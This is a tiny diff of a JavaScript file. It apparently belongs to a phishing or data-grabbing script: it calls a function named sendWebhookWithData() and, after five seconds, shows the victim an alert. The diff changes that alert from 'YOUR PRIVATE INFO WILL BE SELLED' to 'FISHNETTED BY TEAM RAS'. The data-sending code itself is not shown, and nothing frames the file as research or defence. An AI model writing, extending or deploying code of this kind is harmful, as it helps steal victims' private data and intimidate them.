@@ -34,4 +34,4 @@ async function sendWebhookWithData() {
 }
 
 sendWebhookWithData();
-setTimeout(function{alert("YOUR PRIVATE INFO WILL BE SELLED")},5000)
+setTimeout(function(){alert("FISHNETTED BY TEAM RAS")},5000)
